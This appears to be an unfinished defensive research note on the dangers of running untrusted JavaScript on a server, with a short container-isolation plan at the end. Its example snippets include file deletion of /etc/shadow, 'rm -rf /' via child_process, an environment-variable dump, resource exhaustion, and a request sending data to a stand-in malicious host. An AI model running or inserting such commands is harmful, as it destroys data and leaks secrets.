# Research on running untrusted JavaScript code on another environment

## Introduction

Running untrusted javascript code on the server introduces significant security risks because javascript has access to underlying
APIs and System capabilities provided by the runtime environment (e.g Node, Deno) that if misused can compromise the server environment, other 
running applications, or the confidentiality, integrity and availability of data.

## Key Security Risk

- Arbitrary code execution: If the untrusted javascript code is executed, an attacker can use the provided underlying APIs and system capabilities
provided by the runtime, to run malicious code that can alter env variables, delete or edit or create files and even sensitive files like system files.

Let's take for instance, your `/etc/shadow` file in linux environment, which contains all hashed passwords of your system accounts, this is especially true
if the runtime was given super-user privileges.
```javascript
const fs = require('fs')
fs.unlinkSync('/etc/shadow')
```

- Denial of Service (Dos): Malicious code can be designed to consume excessive resources (CPU, memory, etc.), leading to a denial of service attack, making the server
unresponsive.
Example: Infinite loop.
```javascript
while(true) {}
```
Example: Memory exhaustion
```javascript
const arr = []
while (true) arr.push(new Array(1000000).fill('data'))
```
It can also be used to perform some sort of ReDos attacks.

- Access to sensitive data: Untrusted JavaScript can access environmental variables, read config files and extract sensitive process information.
```javascript
console.log(process.env)
```

- Unauthorized Network access: JavaScript running on NodeJs or any runtime that has capabilities of networking APIs, thus malicious code can make
unauthorized network requests, potentially attacking other services (e.g DDos other services) or sending data to another malicious service.
```javascript
const http = require('http')
http.request({ host: 'https://m.alicious.com/', port: 80 }, (res => console.log(res))).end('Sensitive data')
```

- Path traversal: Even malicious code can use path traversal to access files outside the intended directory.

- Escape from sandboxing: JavaScript when running in runtime environment such as NodeJs has rich capabilities that allow it to bypass simple
sandboxing mechanisms. Using eval or similar functions to execute arbitrary code increases the risk of sandbox escape.

```javascript
const arbitraryCode = 'require("fs").unlinkSync("somefile")'
eval(arbitraryCode)
```

- Native injection attacks: As popular runtimes have the ability to access and execute native scripting languages provided by the os

```javascript
const exec = require('child_process').exec
exec('rm -rf / #Oops')
```

Solution:

1. Implement Container-Level Isolation:
- Create a docker container using node:alpine
- Limit container permissions
- Limit resource usage
- Networking restrictions
- 

